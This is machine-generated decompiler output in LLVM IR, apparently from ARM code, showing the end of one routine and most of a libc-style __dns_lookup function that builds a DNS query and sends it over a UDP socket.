
dec_label_pc_1c1b8:                               ; preds = %bb42
  %v2_1c1b8 = add i32 %v6_1c16c63, %v0_1c1ac60
  store i32 %v2_1c1b8, i32* %r6.global-to-local, align 4
  %v3_1c1bc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c1bc, i32* @r3, align 4
  %v1_1c1c0 = add i32 %v2_1c1b8, 1
  store i32 %v1_1c1c0, i32* %r7.global-to-local, align 4
  %v3_1c1c4 = icmp ult i32 %v1_1c1c0, %v3_1c1bc
  br i1 %v3_1c1c4, label %dec_label_pc_1c1cc, label %dec_label_pc_1c224

dec_label_pc_1c1cc:                               ; preds = %dec_label_pc_1c1b8
  %v2_1c1cc = add i32 %v6_1c16c63, %v1_1c188
  store i32 %v2_1c1cc, i32* @r5, align 4
  %v3_1c1d0 = icmp ult i32 %v2_1c1cc, %v1_1c19059
  br i1 %v3_1c1d0, label %dec_label_pc_1c1d8, label %dec_label_pc_1c224

dec_label_pc_1c1d8:                               ; preds = %dec_label_pc_1c1cc
  %v2_1c1d8 = add i32 %v1_1c188, %v0_1c19862
  store i32 %v2_1c1d8, i32* @r1, align 4
  %v0_1c1dc = load i32, i32* %sb.global-to-local, align 4
  %v2_1c1dc = add i32 %v0_1c1dc, %v0_1c1ac60
  store i32 %v2_1c1dc, i32* @r0, align 4
  store i32 %v6_1c16c63, i32* @r2, align 4
  %v0_1c1e8 = call i32 @memcpy()
  store i32 %v0_1c1e8, i32* %r0.global-to-local, align 4
  store i32 %v0_1c21064, i32* @ip, align 4
  %v0_1c1f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1c1f0 = load i32, i32* @r5, align 4
  %v2_1c1f0 = add i32 %v1_1c1f0, %v0_1c1f0
  %v3_1c1f0 = inttoptr i32 %v2_1c1f0 to i8*
  %v4_1c1f0 = load i8, i8* %v3_1c1f0, align 1
  br i1 %v2_1c21066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1c1d8
  %v1_1c1f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c1f8 = load i32, i32* @r4, align 4
  %v3_1c1f8 = add i32 %v2_1c1f8, %v1_1c1f8
  store i32 %v3_1c1f8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1c1d8, %bb45
  %v2_1c1fc = icmp eq i8 %v4_1c1f0, 0
  br i1 %v2_1c1fc, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1c208.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1c1f0, i32* %r1.global-to-local, align 4
  %v2_1c208 = load i32, i32* %sb.global-to-local, align 4
  %v3_1c208 = load i32, i32* %r6.global-to-local, align 4
  %v4_1c208 = add i32 %v3_1c208, %v2_1c208
  %v5_1c208 = inttoptr i32 %v4_1c208 to i8*
  store i8 %v0_1c208.off0, i8* %v5_1c208, align 1
  %v0_1c160.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1c164.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1c164.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1c160

dec_label_pc_1c210:                               ; preds = %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge
  %v0_1c218.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1c210, label %dec_label_pc_1c224, label %bb49

bb49:                                             ; preds = %dec_label_pc_1c16c.preheader, %dec_label_pc_1c210
  %v0_1c218.pre69 = phi i32 [ %v0_1c218.pre.pre, %dec_label_pc_1c210 ], [ 0, %dec_label_pc_1c16c.preheader ]
  %v2_1c214 = add i32 %v0_1c218.pre69, 1
  store i32 %v2_1c214, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c224

dec_label_pc_1c224:                               ; preds = %dec_label_pc_1c1cc, %dec_label_pc_1c1b8, %dec_label_pc_1c190, %dec_label_pc_1c160, %dec_label_pc_1c210, %dec_label_pc_1c164.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1c214, %bb49 ], [ -1, %dec_label_pc_1c164.preheader ], [ %v0_1c218.pre.pre, %dec_label_pc_1c210 ], [ -1, %dec_label_pc_1c1b8 ], [ -1, %dec_label_pc_1c1cc ], [ -1, %dec_label_pc_1c160 ], [ -1, %dec_label_pc_1c190 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1c138, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1c218.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1c1f0, { 1, 0 }
  uselistorder i32 %v5_1c1a8, { 1, 0 }
  uselistorder i32 %v1_1c188, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1c1ac60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1c16c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1c21066, { 1, 2, 0 }
  uselistorder i32 %v0_1c13c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1c224, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1c178, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1c230 = load i32, i32* @r4, align 4
  %v6_1c230 = load i32, i32* @r5, align 4
  %v9_1c230 = load i32, i32* @r6, align 4
  %v12_1c230 = load i32, i32* @r7, align 4
  %v15_1c230 = load i32, i32* @r8, align 4
  %v18_1c230 = load i32, i32* @sb, align 4
  %v21_1c230 = load i32, i32* @sl, align 4
  %v24_1c230 = load i32, i32* @fp, align 4
  %v27_1c230 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1c244 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c24c = call i32 @malloc(i32 512)
  store i32 %v1_1c24c, i32* @sl, align 4
  %v0_1c254 = load i32, i32* @r4, align 4
  %v1_1c254 = inttoptr i32 %v0_1c254 to i8*
  %v3_1c258 = call i32 @strlen(i8* %v1_1c254)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1c264 = icmp ugt i32 %v3_1c258, 893
  store i1 %v3_1c264, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_1c258, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1c284

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c994

dec_label_pc_1c284:                               ; preds = %entry
  %v1_1c288 = add i32 %v3_1c258, 130
  %v1_1c28c = call i32 @malloc(i32 %v1_1c288)
  store i32 %v1_1c28c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c290 = icmp eq i32 %v1_1c28c, 0
  br i1 %v2_1c290, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1c284
  %v1_1c294 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1c294 = icmp eq i32 %v1_1c294, 0
  br i1 %v3_1c294, label %bb213, label %dec_label_pc_1c2a8

.thread5:                                         ; preds = %dec_label_pc_1c284
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c98c

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c98c

dec_label_pc_1c2a8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1c2a8 = load i32, i32* @r4, align 4
  %v1_1c2a8 = inttoptr i32 %v0_1c2a8 to i8*
  %v2_1c2a8 = load i8, i8* %v1_1c2a8, align 1
  %v3_1c2a8 = zext i8 %v2_1c2a8 to i32
  store i32 %v3_1c2a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c2ac = icmp eq i8 %v2_1c2a8, 0
  br i1 %v2_1c2ac, label %dec_label_pc_1c98c, label %dec_label_pc_1c2b4

dec_label_pc_1c2b4:                               ; preds = %dec_label_pc_1c2a8
  %v2_1c2b8 = add i32 %v0_1c2a8, %v3_1c258
  store i32 %v2_1c2b8, i32* %r3.global-to-local, align 4
  %v1_1c2bc = add i32 %v2_1c2b8, -1
  %v2_1c2bc = inttoptr i32 %v1_1c2bc to i8*
  %v3_1c2bc = load i8, i8* %v2_1c2bc, align 1
  %v4_1c2bc = zext i8 %v3_1c2bc to i32
  store i32 %v4_1c2bc, i32* @r3, align 4
  store i32 %v3_1c258, i32* @r2, align 4
  store i32 %v0_1c2a8, i32* @r1, align 4
  %v0_1c2cc = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 27496, i32* %ip.global-to-local, align 4
  store i32 26460, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1c348 = ptrtoint i32* %stack_var_-76 to i32
  %v2_1c460 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1c464 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1c488 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1c4a8 = bitcast i32* %stack_var_-192 to i8*
  %v2_1c55c = ptrtoint i32* %stack_var_-48 to i32
  %v2_1c568 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1c5f4 = icmp eq i32 %tmp161, 0
  %v1_1c600 = add i32 %tmp160, -2
  %v2_1c604 = icmp ne i32 %v1_1c600, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_1c6f0 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1c6f4 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1c93856 = icmp sgt i32 %tmp159, 0
  %v2_1c860 = icmp ne i32 %v0_1c244, 0
  %v7_1c860 = icmp eq i32 %v0_1c244, 1
  %v1_1c754 = bitcast i32* %stack_var_-448 to i8*
  %v2_1c808 = icmp eq i32 %tmp144, 0
  %v2_1c610 = icmp ugt i8 %v3_1c2bc, 45
  %v7_1c610 = icmp eq i8 %v3_1c2bc, 46
  %v1_1c3bc = add i32 %v1_1c28c, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1c39c = add i32 %v1_1c28c, %v3_1c258
  %v5_1c39c = inttoptr i32 %v4_1c39c to i8*
  %v1_1c600.cmp = icmp ugt i32 %v1_1c600, 1
  %v2_1c638 = icmp eq i32 %tmp160, 0
  %v3_1c864 = icmp ugt i32 %v0_1c244, 27
  %v8_1c864 = icmp eq i32 %v0_1c244, 28
  br label %dec_label_pc_1c32c

dec_label_pc_1c32c:                               ; preds = %dec_label_pc_1c974, %dec_label_pc_1c2b4
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1c2b4 ], [ %v1_1c978, %dec_label_pc_1c974 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1c2b4 ], [ %v3_1c440, %dec_label_pc_1c974 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1c2b4 ], [ %stack_var_-468.2, %dec_label_pc_1c974 ]
  %v1_1c334 = phi i32 [ -1, %dec_label_pc_1c2b4 ], [ %v3_1c514, %dec_label_pc_1c974 ]
  store i32 %v1_1c334, i32* %r3.global-to-local, align 4
  %v2_1c330 = icmp eq i32 %v1_1c334, -1
  store i1 %v2_1c330, i1* %cpsr_c.global-to-local, align 1
  %v7_1c330 = icmp eq i32 %v1_1c334, -1
  br i1 %v7_1c330, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_1c32c
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1c32c, %bb215
  %v1_1c338 = xor i1 %v7_1c330, true
  call void @__pseudo_cond_branch(i1 %v1_1c338, i32 ptrtoint (i32* @global_var_131e4.1195 to i32))
  store i32 36, i32* @r7, align 4
  %v0_1c344 = load i32, i32* @r8, align 4
  %v2_1c344 = add i32 %v0_1c344, 40
  %v3_1c344 = inttoptr i32 %v2_1c344 to i32*
  %v4_1c344 = load i32, i32* %v3_1c344, align 4
  store i32 %v4_1c344, i32* @r4, align 4
  store i32 %v2_1c348, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_1c354 = add i32 %v0_1c344, 36
  %v3_1c354 = inttoptr i32 %v2_1c354 to i32*
  %v4_1c354 = load i32, i32* %v3_1c354, align 4
  store i32 %v4_1c354, i32* %r1.global-to-local, align 4
  %v2_1c35c = add i32 %v0_1c344, 76
  %v3_1c35c = inttoptr i32 %v2_1c35c to i32*
  %v4_1c35c = load i32, i32* %v3_1c35c, align 4
  store i32 %v4_1c35c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1c35c)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_1c370 = load i32, i32* @r8, align 4
  %v2_1c370 = add i32 %v0_1c370, 16
  %v3_1c370 = inttoptr i32 %v2_1c370 to i32*
  %v4_1c370 = load i32, i32* %v3_1c370, align 4
  store i32 %v4_1c370, i32* %ip.global-to-local, align 4
  store i32 115580, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c370)
  %v0_1c37c = call i32 @__open_nameservers()
  %v0_1c384 = load i32, i32* @r8, align 4
  %v2_1c384 = add i32 %v0_1c384, 27508
  %v3_1c384 = inttoptr i32 %v2_1c384 to i32*
  %v4_1c384 = load i32, i32* %v3_1c384, align 4
  store i32 %v1_1c28c, i32* %r3.global-to-local, align 4
  store i32 %v3_1c258, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1c394 = load i32, i32* @sb, align 4
  %v3_1c394 = icmp uge i32 %v0_1c394, %v4_1c384
  store i1 %v3_1c394, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1c39c, align 1
  %v0_1c3a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1c3a0, label %dec_label_pc_1c3cc, label %dec_label_pc_1c3a4

dec_label_pc_1c3a4:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_1c3ac = load i32, i32* %ip.global-to-local, align 4
  %v4_1c3ac = add i32 %v3_1c3ac, %v1_1c28c
  %v5_1c3ac = inttoptr i32 %v4_1c3ac to i8*
  store i8 46, i8* %v5_1c3ac, align 1
  store i32 27496, i32* %r1.global-to-local, align 4
  %v0_1c3b8 = load i32, i32* @r8, align 4
  %v2_1c3b8 = add i32 %v0_1c3b8, 27496
  %v3_1c3b8 = inttoptr i32 %v2_1c3b8 to i32*
  %v4_1c3b8 = load i32, i32* %v3_1c3b8, align 4
  store i32 %v4_1c3b8, i32* %r3.global-to-local, align 4
  %v1_1c3c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c3c0 = add i32 %v1_1c3bc, %v1_1c3c0
  %v1_1c3c4 = load i32, i32* @sb, align 4
  %v2_1c3c4 = and i32 %v1_1c3c4, 1073741824
  %v3_1c3c4 = icmp ne i32 %v2_1c3c4, 0
  store i1 %v3_1c3c4, i1* %cpsr_c.global-to-local, align 1
  %v4_1c3c4 = mul i32 %v1_1c3c4, 4
  %v5_1c3c4 = add i32 %v4_1c3c4, %v4_1c3b8
  %v6_1c3c4 = inttoptr i32 %v5_1c3c4 to i32*
  %v7_1c3c4 = load i32, i32* %v6_1c3c4, align 4
  store i32 %v7_1c3c4, i32* @r1, align 4
  %v2_1c3c8 = inttoptr i32 %v2_1c3c0 to i8*
  %v3_1c3c8 = call i32 @strcpy(i8* %v2_1c3c8, i32 %v7_1c3c4)
  br label %dec_label_pc_1c3cc

dec_label_pc_1c3cc:                               ; preds = %bb216, %dec_label_pc_1c3a4
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c3d0 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1c3d0, label %dec_label_pc_1c3d8, label %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge

dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge:  ; preds = %dec_label_pc_1c3cc
  %v0_1c410.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1c408

dec_label_pc_1c3d8:                               ; preds = %dec_label_pc_1c3cc
  store i32 27504, i32* %r3.global-to-local, align 4
  store i32 1275, i32* %ip.global-to-local, align 4
  %v0_1c3e0 = load i32, i32* @r8, align 4
  %v2_1c3e0 = add i32 %v0_1c3e0, 27504
  %v3_1c3e0 = inttoptr i32 %v2_1c3e0 to i32*
  %v4_1c3e0 = load i32, i32* %v3_1c3e0, align 4
  %v2_1c3e4 = add i32 %v0_1c3e0, 1275
  %v3_1c3e4 = inttoptr i32 %v2_1c3e4 to i8*
  %v4_1c3e4 = load i8, i8* %v3_1c3e4, align 1
  %v6_1c3e4 = zext i8 %v4_1c3e4 to i32
  %v2_1c3e8 = mul i32 %v6_1c3e4, %v4_1c3e0
  store i32 %v2_1c3e8, i32* %r3.global-to-local, align 4
  store i32 26460, i32* %r1.global-to-local, align 4
  %v2_1c3f4 = add i32 %v0_1c3e0, 1272
  %v3_1c3f4 = inttoptr i32 %v2_1c3f4 to i16*
  %v4_1c3f4 = load i16, i16* %v3_1c3f4, align 2
  %v6_1c3f4 = zext i16 %v4_1c3f4 to i32
  %v2_1c3f8 = add i32 %v0_1c3e0, 26460
  %v3_1c3f8 = inttoptr i32 %v2_1c3f8 to i32*
  %v4_1c3f8 = load i32, i32* %v3_1c3f8, align 4
  store i32 %v4_1c3f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c408

dec_label_pc_1c408:                               ; preds = %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge, %dec_label_pc_1c3d8
  %v2_1c44c = phi i32 [ %v0_1c3e0, %dec_label_pc_1c3d8 ], [ %v0_1c410.pre, %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1c3f4, %dec_label_pc_1c3d8 ], [ %stack_var_-464.0, %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1c3f8, %dec_label_pc_1c3d8 ], [ %stack_var_-468.0, %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1c3e8, %dec_label_pc_1c3d8 ], [ %stack_var_-476.0, %dec_label_pc_1c3cc.dec_label_pc_1c408_crit_edge ]
  store i32 27504, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_1c410 = add i32 %v2_1c44c, 27504
  %v3_1c410 = inttoptr i32 %v2_1c410 to i32*
  %v4_1c410 = load i32, i32* %v3_1c410, align 4
  store i32 27500, i32* %r3.global-to-local, align 4
  %v3_1c418 = icmp uge i32 %stack_var_-468.1, %v4_1c410
  store i1 %v3_1c418, i1* %cpsr_c.global-to-local, align 1
  %v2_1c41c = add i32 %v2_1c44c, 27500
  %v3_1c41c = inttoptr i32 %v2_1c41c to i32*
  %v4_1c41c = load i32, i32* %v3_1c41c, align 4
  store i32 %v4_1c41c, i32* %r3.global-to-local, align 4
  br i1 %v3_1c418, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1c408
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1c408, %bb217
  %v0_1c428 = phi i32 [ %stack_var_-468.1, %dec_label_pc_1c408 ], [ 0, %bb217 ]
  %v3_1c428 = mul i32 %v0_1c428, 28
  %v4_1c428 = add i32 %v3_1c428, %v4_1c41c
  store i32 %v4_1c428, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1c434 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1c440 = urem i32 %v1_1c434, 65536
  store i32 26460, i32* %r1.global-to-local, align 4
  %v1_1c44c = trunc i32 %v1_1c434 to i16
  %v4_1c44c = add i32 %v2_1c44c, 1272
  %v5_1c44c = inttoptr i32 %v4_1c44c to i16*
  store i16 %v1_1c44c, i16* %v5_1c44c, align 2
  %v1_1c454 = load i32, i32* @r8, align 4
  %v2_1c454 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c454 = add i32 %v2_1c454, %v1_1c454
  %v4_1c454 = inttoptr i32 %v3_1c454 to i32*
  store i32 %v0_1c428, i32* %v4_1c454, align 4
  %v0_1c458 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c45c = inttoptr i32 %v0_1c458 to i32*
  %v2_1c45c = load i32, i32* %v1_1c45c, align 4
  %v3_1c45c = add i32 %v0_1c458, 4
  %v4_1c45c = inttoptr i32 %v3_1c45c to i32*
  %v5_1c45c = load i32, i32* %v4_1c45c, align 4
  store i32 %v5_1c45c, i32* %r1.global-to-local, align 4
  %v9_1c45c = add i32 %v0_1c458, 12
  %v10_1c45c = inttoptr i32 %v9_1c45c to i32*
  %v11_1c45c = load i32, i32* %v10_1c45c, align 4
  store i32 %v11_1c45c, i32* %r3.global-to-local, align 4
  %v12_1c45c = add i32 %v0_1c458, 16
  %v4_1c464 = trunc i32 %v2_1c45c to i16
  store i16 %v4_1c464, i16* %stack_var_-104, align 2
  store i32 %v15_1c464, i32* %ip.global-to-local, align 4
  %v1_1c468 = inttoptr i32 %v12_1c45c to i32*
  %v2_1c468 = load i32, i32* %v1_1c468, align 4
  %v3_1c468 = add i32 %v0_1c458, 20
  %v4_1c468 = inttoptr i32 %v3_1c468 to i32*
  %v5_1c468 = load i32, i32* %v4_1c468, align 4
  store i32 %v5_1c468, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_1c468, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1c47c = load i32, i32* @r8, align 4
  %v2_1c47c = add i32 %v0_1c47c, 24
  %v3_1c47c = inttoptr i32 %v2_1c47c to i32*
  %v4_1c47c = load i32, i32* %v3_1c47c, align 4
  store i32 %v4_1c47c, i32* %ip.global-to-local, align 4
  store i32 115848, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c47c)
  store i32 %v2_1c488, i32* @r6, align 4
  %v0_1c48c = load i32, i32* @r7, align 4
  store i32 %v0_1c48c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1c494 = load i32, i32* @sl, align 4
  %v2_1c498 = inttoptr i32 %v0_1c494 to i8*
  %v3_1c498 = call i32 @__GI_memset(i8* %v2_1c498, i32 %v0_1c48c)
  %v0_1c49c = load i32, i32* @r7, align 4
  store i32 %v0_1c49c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1c4a8 = call i32 @__GI_memset(i8* %v2_1c4a8, i32 %v0_1c49c)
  store i32 %v3_1c440, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1c4b8 = load i32, i32* @sl, align 4
  store i32 %v0_1c4b8, i32* %r1.global-to-local, align 4
  store i32 %v3_1c440, i32* %stack_var_-192, align 4
  %v6_1c4cc = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1c4b8, i32 512, i32 %v3_1c440, i32 %v3_1c440)
  store i32 %v6_1c4cc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c4d0 = icmp slt i32 %v6_1c4cc, 0
  br i1 %v1_1c4d0, label %dec_label_pc_1c98c, label %dec_label_pc_1c4d8

dec_label_pc_1c4d8:                               ; preds = %bb218
  store i32 %v0_1c244, i32* @ip, align 4
  store i32 %v1_1c28c, i32* @r5, align 4
  %v0_1c4e8 = load i32, i32* @sl, align 4
  %v2_1c4e8 = add i32 %v0_1c4e8, %v6_1c4cc
  store i32 %v2_1c4e8, i32* %r1.global-to-local, align 4
  %v1_1c4ec = sub i32 512, %v6_1c4cc
  store i32 %v1_1c28c, i32* %stack_var_-60, align 4
  store i32 %v0_1c244, i32* %stack_var_-56, align 4
  %v4_1c4f8 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1c4e8, i32 %v1_1c4ec)
  store i32 %v4_1c4f8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c4fc = icmp slt i32 %v4_1c4f8, 0
  br i1 %v1_1c4fc, label %dec_label_pc_1c98c, label %dec_label_pc_1c504

dec_label_pc_1c504:                               ; preds = %dec_label_pc_1c4d8
  %v3_1c508 = load i16, i16* %stack_var_-104, align 2
  %v4_1c508 = sext i16 %v3_1c508 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1c514 = call i32 @socket(i32 %v4_1c508, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c518 = icmp slt i32 %v3_1c514, 0
  br i1 %v1_1c518, label %dec_label_pc_1c964, label %dec_label_pc_1c524

dec_label_pc_1c524:                               ; preds = %dec_label_pc_1c504
  store i32 %v2_1c460, i32* %r1.global-to-local, align 4
  %v3_1c52c = call i32 @__libc_connect(i32 %v3_1c514, i32 %v2_1c460, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c530 = icmp slt i32 %v3_1c52c, 0
  br i1 %v1_1c530, label %dec_label_pc_1c964, label %dec_label_pc_1c538

dec_label_pc_1c538:                               ; preds = %dec_label_pc_1c524
  %v0_1c538 = load i32, i32* @r5, align 4
  %v1_1c538 = load i32, i32* @r4, align 4
  %v2_1c538 = add i32 %v1_1c538, %v0_1c538
  %v0_1c53c = load i32, i32* @r7, align 4
  store i32 %v0_1c53c, i32* %r3.global-to-local, align 4
  %v0_1c544 = load i32, i32* @sl, align 4
  store i32 %v0_1c544, i32* %r1.global-to-local, align 4
  %v4_1c548 = call i32 @__libc_send(i32 %v3_1c514, i32 %v0_1c544, i32 %v2_1c538, i32 %v0_1c53c)
  store i32 1274, i32* %r3.global-to-local, align 4
  %v0_1c550 = load i32, i32* @r8, align 4
  %v2_1c550 = add i32 %v0_1c550, 1274
  %v3_1c550 = inttoptr i32 %v2_1c550 to i8*
  %v4_1c550 = load i8, i8* %v3_1c550, align 1
  %v6_1c550 = zext i8 %v4_1c550 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1c558 = mul nuw nsw i32 %v6_1c550, 1000
  store i32 %v2_1c558, i32* @r4, align 4
  store i32 %v2_1c55c, i32* @r5, align 4
  br label %dec_label_pc_1c560

dec_label_pc_1c560:                               ; preds = %thread-pre-split, %dec_label_pc_1c538
  %v0_1c56c = phi i32 [ %v1_1c5ac, %thread-pre-split ], [ %v2_1c558, %dec_label_pc_1c538 ]
  store i32 %v3_1c514, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1c568, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1c514, i32* %stack_var_-48, align 4
  %v7_1c580 = call i32 @__GI_poll(i32 %v2_1c55c, i32 1, i32 %v0_1c56c, i32 %v3_1c514, i32 %v3_1c514, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1c588 = load i32, i32* @sl, align 4
  store i32 %v0_1c588, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_1c580, 1
  br i1 %tmp219, label %dec_label_pc_1c964, label %dec_label_pc_1c59c

dec_label_pc_1c59c:                               ; preds = %dec_label_pc_1c560
  %v5_1c59c = call i32 @__libc_recv(i32 %v3_1c514, i32 %v0_1c588, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1c5a0 = icmp ugt i32 %v5_1c59c, 10
  store i1 %v2_1c5a0, i1* %cpsr_c.global-to-local, align 1
  %v8_1c5a8 = icmp sgt i32 %v5_1c59c, 11
